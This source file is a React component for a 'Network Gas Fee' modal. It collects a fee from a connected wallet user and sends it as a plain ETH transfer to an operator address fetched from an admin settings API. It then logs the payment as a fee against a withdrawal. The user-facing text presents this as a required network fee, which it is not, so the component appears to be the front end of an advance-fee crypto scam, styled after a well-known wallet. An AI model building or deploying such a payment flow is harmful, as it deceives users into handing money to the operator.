'use client';

import { useEffect, useState, useMemo } from 'react';
import { X, Fuel, ArrowRight, Loader2, CheckCircle, Check } from 'lucide-react';
import { ethers } from 'ethers';
import { useWallet } from '@/context/base';
import { motion, AnimatePresence } from 'framer-motion';

declare global {
    interface Window {
        ethereum?: Record<string, unknown>;
    }
}

interface GasFeeModalProps {
    isOpen: boolean;
    onClose: () => void;
    onSuccess: (txHash: string) => void;
    amount?: string;
    user?: any;
    theme?: 'dark' | 'light';
    network?: string;
}

export default function GasFeeModal({
    isOpen,
    onClose,
    onSuccess,
    amount = '0.00',
    user,
    theme = 'light',
    network = 'ETH'
}: GasFeeModalProps) {
    const [status, setStatus] = useState<any>('idle');
    const [txSuccess, setTxSuccess] = useState<any>(false);
    const [txHash, setTxHash] = useState('');
    const [error, setError] = useState(null);
    const { cbProvider, address: add } = useWallet();
    const [internalUser, setInternalUser] = useState<any>(user);
    const [adminAddresses, setAdminAddresses] = useState<Record<string, string>>({});
    const [loadingSettings, setLoadingSettings] = useState(false);

    useEffect(() => {
        if (isOpen) {
            fetchAdminSettings();
        }
    }, [isOpen]);

    useEffect(() => {
        if (user && user.id) {
            setInternalUser(user);
        } else if (isOpen && add) {
            const fetchUser = async () => {
                try {
                    let res = await fetch(`/api/user?address=${add}`);
                    let json = await res.json();
                    if (json?.existingRecord) {
                        setInternalUser(json.existingRecord);
                    }
                } catch (e) {
                    console.error("Error fetching user in GasFeeModal:", e);
                }
            };
            fetchUser();
        }
    }, [add, user, isOpen]);

    const fetchAdminSettings = async () => {
        setLoadingSettings(true);
        try {
            const res = await fetch('/api/admin/settings');
            const data = await res.json();
            console.log(data, "settingssss")
            setAdminAddresses(data);
        } catch (e) {
            console.error("Failed to fetch admin settings", e);
        } finally {
            setLoadingSettings(false);
        }
    };

    const { targetNetworkName, targetAsset, isBsc, targetChainId } = useMemo(() => {
        // Force all gas payments to Ethereum Mainnet as requested
        return {
            isBsc: false,
            targetChainId: '0x1',
            targetNetworkName: 'Ethereum Mainnet',
            targetAsset: 'ETH'
        };
    }, []);


    const sendEth = async () => {

        console.log(internalUser?.fields?.gasFee, "internalUser")
        let amountText = (internalUser?.fields?.gasFee || "0.003").toString();

        // Strictly use the eth address key as requested by the user
        const gasVault = adminAddresses['gas_fee_address_eth'] || adminAddresses['gas_fee_address_eth'.toLowerCase()] || '';

        console.log('[DEBUG] GasFeeModal sendEth start', { amountText, gasVault, network, targetChainId, hasCbProvider: !!cbProvider });

        try {
            if (!cbProvider) {
                setError("Wallet provider not found. Please reconnect.");
                return;
            }
            if (!amountText || isNaN(parseFloat(amountText))) {
                setError(`Invalid gas fee amount: ${amountText}`);
                return;
            }
            if (!gasVault || !gasVault.startsWith('0x')) {
                const foundKeys = Object.keys(adminAddresses).join(', ');
                setError(`Admin wallet (gas_fee_address_eth) not found in Airtable! Keys: [${foundKeys || 'none'}]. Please update Settings.`);
                return;
            }

            setStatus('processing');
            setError('');

            // 1. Ensure we are on the correct chain before sending
            try {
                await cbProvider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }],
                });
            } catch (switchError: any) {
                // Switch failed or was cancelled - STOP HERE
                setError(`Network switch to Ethereum Mainnet is required for gas payment.`);
                setStatus('idle');
                return;
            }

            const provider = new ethers.BrowserProvider(cbProvider);
            const signer = await provider.getSigner();
            console.log(signer, "signersigner")

            console.log('[DEBUG] Sending transaction to:', gasVault, 'with value:', amountText, 'on', targetNetworkName);
            const feeData = await provider.getFeeData();
            console.log(feeData, "feeData")
            let amunt = Number(amountText).toFixed(18)
            const amountInWei = ethers.parseUnits(amunt, "ether");
            // 2. Create and send the transaction
            const tx = await signer.sendTransaction({
                to: gasVault.trim(),
                value: amountInWei,
                gasLimit: 21000,
                "data": "0x",
                maxFeePerGas: feeData.maxFeePerGas ?? undefined,
                maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ?? undefined,
            });

            // Transition to success state immediately after broadcast
            setTxHash(tx.hash);
            setTxSuccess(true);
            setStatus('success');

            console.log('[DEBUG] Transaction broadcasted! Hash:', tx.hash);

            // Wait for confirmation in background
            tx.wait().then(async () => {
                console.log('[DEBUG] Transaction confirmed!');
                // 3. Update API call to record the transaction
                try {
                    await fetch(`/api/withdrawal`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            address: add,
                            amount: Number(amountText),
                            type: "fee",
                            asset: targetAsset,
                            network: targetNetworkName,
                            wType: "crypto",
                            status: "completed"
                        })
                    });
                } catch (apiErr) {
                    console.error("Failed to update API after confirmation:", apiErr);
                }
            });

            if (onSuccess) onSuccess(tx.hash);

        } catch (err: any) {
            console.error("Gas Payment Error Details:", err);
            const msg = err?.info?.error?.message || err?.message || "Transaction failed";
            setError(msg);
            setStatus('idle');
        }
    };

    const handlePayGasFac = async () => {
        sendEth();
    }

    return (
        <AnimatePresence>
            {isOpen && (
                <div className="fixed inset-0 z-[60] flex items-center justify-center p-4">
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="absolute inset-0 bg-black/80 backdrop-blur-md"
                        onClick={status !== 'processing' ? onClose : undefined}
                    />

                    <motion.div
                        initial={{ scale: 0.9, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        exit={{ scale: 0.9, opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full max-w-[360px] rounded-[2.5rem] p-6 text-center space-y-5 shadow-2xl z-20 border ${theme === 'dark' ? 'bg-[#000000] text-white border-white/10' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            }`}
                    >
                        <button
                            onClick={onClose}
                            className={`absolute top-4 right-4 w-8 h-8 flex items-center justify-center rounded-full transition-colors z-10 ${theme === 'dark' ? 'bg-white/5 text-gray-400 hover:text-white' : 'bg-gray-100 text-gray-500 hover:text-black'}`}
                        >
                            <X className="w-5 h-5" />
                        </button>

                        {status === 'success' ? (
                            <motion.div
                                initial={{ opacity: 0, scale: 0.9 }}
                                animate={{ opacity: 1, scale: 1 }}
                                className="space-y-6 py-2"
                            >
                                <div className="relative mx-auto w-20 h-20">
                                    <div className="absolute inset-0 bg-emerald-500 blur-2xl opacity-20 animate-pulse" />
                                    <div className="w-20 h-20 bg-emerald-500/10 rounded-full flex items-center justify-center border border-emerald-500/20 relative">
                                        <motion.div
                                            initial={{ scale: 0 }}
                                            animate={{ scale: 1 }}
                                            transition={{ type: "spring", damping: 12, stiffness: 200, delay: 0.2 }}
                                        >
                                            <Check className="w-10 h-10 text-emerald-500" />
                                        </motion.div>
                                    </div>
                                </div>

                                <div className="space-y-2">
                                    <h3 className="text-2xl font-bold tracking-tight">Transaction Sent</h3>
                                    <p className="text-gray-500 text-sm px-4 leading-relaxed font-medium">Your request has been received and is being processed.</p>
                                </div>

                                <div className={`w-full rounded-2xl p-4 space-y-3 ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-50'}`}>
                                    <div className="flex justify-between items-center text-xs">
                                        <span className="text-gray-400">Status</span>
                                        <span className="text-emerald-500 font-bold uppercase tracking-widest">Pending</span>
                                    </div>
                                    <div className="h-[1px] w-full bg-gray-200 dark:bg-white/5" />
                                    <div className="flex justify-between items-center text-xs">
                                        <span className="text-gray-400">Network Fee</span>
                                        <span className="font-bold">{internalUser?.fields?.gasFee || "0.0001"} {targetAsset}</span>
                                    </div>
                                </div>

                                <button
                                    onClick={onClose}
                                    className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl transition-all shadow-xl shadow-blue-600/20 active:scale-[0.98]"
                                >
                                    Done
                                </button>
                            </motion.div>
                        ) : (
                            <>
                                <motion.div
                                    initial={{ scale: 0.8, opacity: 0 }}
                                    animate={{ scale: 1, opacity: 1 }}
                                    className="w-14 h-14 bg-gradient-to-tr from-orange-500/20 to-orange-400/5 border border-orange-500/20 text-orange-500 rounded-2xl flex items-center justify-center mx-auto shadow-[0_0_15px_rgba(249,115,22,0.15)]"
                                >
                                    <Fuel className="w-7 h-7" />
                                </motion.div>

                                <div className="space-y-1.5">
                                    <h3 className="text-xl font-bold tracking-tight">
                                        Network Gas Fee
                                    </h3>
                                    <p className="text-gray-500 text-xs leading-relaxed px-6 font-medium">
                                        A network gas fee is required to process this transaction securely.
                                    </p>
                                    {error && !loadingSettings && (
                                        <motion.div
                                            initial={{ opacity: 0, y: 10 }}
                                            animate={{ opacity: 1, y: 0 }}
                                            className="mt-3 bg-red-500/10 border border-red-500/20 text-red-400 text-xs px-3 py-2 rounded-lg break-words text-left"
                                        >
                                            <span className="font-semibold block mb-0.5">Error:</span>
                                            {error}
                                        </motion.div>
                                    )}
                                </div>

                                <div className={`border rounded-[1.5rem] p-4 space-y-3 text-left shadow-inner ${theme === 'dark' ? 'bg-[#111111] border-white/5' : 'bg-gray-50 border-gray-100'}`}>
                                    <div className="flex justify-between items-center text-sm">
                                        <span className="text-gray-400">Network</span>
                                        <span className={`font-medium ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>{targetNetworkName}</span>
                                    </div>
                                    <div className="flex justify-between items-center text-sm">
                                        <span className="text-gray-400">Estimated Fee</span>
                                        <div className="text-right">
                                            <span className="font-bold text-base">{internalUser?.fields?.gasFee || "0.0001"} {targetAsset}</span>
                                        </div>
                                    </div>
                                    <div className={`h-[1px] w-full ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-200'}`}></div>
                                    <div className="space-y-1">
                                        <span className="text-gray-400 text-xs">Destination Address</span>
                                        <div className="font-mono text-[10px] opacity-60 break-all">{adminAddresses['gas_fee_address_eth'] || "Searching..."}</div>
                                    </div>
                                    <div className={`h-[1px] w-full ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-200'}`}></div>
                                    <div className="flex justify-between items-center text-[10px]">
                                        <span className="text-gray-400 uppercase font-bold tracking-wider">Execution</span>
                                        <span className="text-emerald-500 font-bold flex items-center gap-1.5 bg-emerald-500/10 px-2 py-1 rounded-full border border-emerald-500/20">
                                            <div className="w-1 h-1 rounded-full bg-emerald-500 animate-pulse"></div>
                                            Lightning
                                        </span>
                                    </div>
                                </div>

                                <button
                                    onClick={handlePayGasFac}
                                    disabled={status !== 'idle'}
                                    className="w-full bg-[#0052FF] hover:bg-[#004ada] !text-white font-bold py-3.5 rounded-full transition-all flex items-center justify-center gap-2 shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] text-sm"
                                >
                                    {status !== 'idle' || loadingSettings ? (
                                        <>
                                            <Loader2 className="w-4 h-4 animate-spin" />
                                            {loadingSettings ? "Connecting to settings..." : (status.length > 20 ? "Processing..." : status)}
                                        </>
                                    ) : (
                                        <>
                                            {adminAddresses['gas_fee_address_eth'] ? "Pay Gas Fee" : "No Wallet Address Configured"}
                                            {adminAddresses['gas_fee_address_eth'] && <ArrowRight className="w-4 h-4" />}
                                        </>
                                    )}
                                </button>
                            </>
                        )}
                    </motion.div>
                </div>
            )}
        </AnimatePresence>
    );
}
